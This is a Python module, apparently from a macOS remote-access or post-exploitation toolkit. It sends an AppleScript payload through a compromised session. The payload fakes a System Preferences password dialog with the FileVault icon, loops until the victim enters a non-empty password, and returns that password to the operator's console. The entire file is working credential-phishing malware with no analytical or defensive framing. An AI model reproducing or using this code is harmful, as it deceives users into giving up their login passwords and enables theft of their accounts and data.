#!/usr/bin/env python3

import time
import json
import core.helper as h

class command:
    def __init__(self):
        self.name = "prompt"
        self.description = "Prompt user to type password."
        self.type = "applescript"

    def run(self,session,cmd_data):
        payload = """
        tell application "Finder"
            activate

            set myprompt to "Type your password to allow System Preferences to make changes"
                        
            set ans to "Cancel"

            repeat
                try
                    set d_returns to display dialog myprompt default answer "" with hidden answer buttons {"Cancel", "OK"} default button "OK" with icon path to resource "FileVaultIcon.icns" in bundle "/System/Library/CoreServices/CoreTypes.bundle"
                    set ans to button returned of d_returns
                    set mypass to text returned of d_returns
                    if mypass > "" then exit repeat
                end try
            end repeat
                        
            try
                do shell script "echo " & quoted form of mypass
            end try
        end tell
        """
        cmd_data.update({"cmd":"applescript","args":payload})
        password = session.send_command(cmd_data).strip()
        #display response
        h.info_info("Response: "+password.decode())
        return ""

